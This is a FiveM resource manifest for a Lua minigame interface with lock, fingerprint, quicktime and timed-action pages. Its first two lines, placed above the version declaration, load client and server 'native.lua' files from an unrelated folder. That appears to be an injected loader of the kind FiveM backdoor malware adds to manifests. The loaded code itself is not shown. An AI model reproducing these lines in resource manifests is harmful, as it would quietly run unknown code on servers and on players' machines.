

client_script '@NEW%20SCRIPTS%20TO%20WORK%20ON/client/native.lua'
server_script '@NEW%20SCRIPTS%20TO%20WORK%20ON/server/native.lua'
fx_version 'cerulean'
games { 'rdr3', 'gta5' }

lua54 'yes'

shared_scripts {
    'cfg.lua'
}

client_scripts {
    'client/*.lua',
}

server_scripts {
    'server/*.lua',
}

ui_page "web/dist/index.html"

files {
    "web/dist/*.html",
    'web/dist/*.*',
    'web/dist/assets/*.*',
    'web/dist/combinationLock/*.*',
    'web/dist/fingerprint/*.*',
    'web/dist/quicktimeEvent/*.*',
    'web/dist/timedAction/*.*',
}

escrow_ignore {
    'cfg.lua',
    'client/editable_client.lua',
    'server/editable_server.lua',
}
dependency '/assetpacks'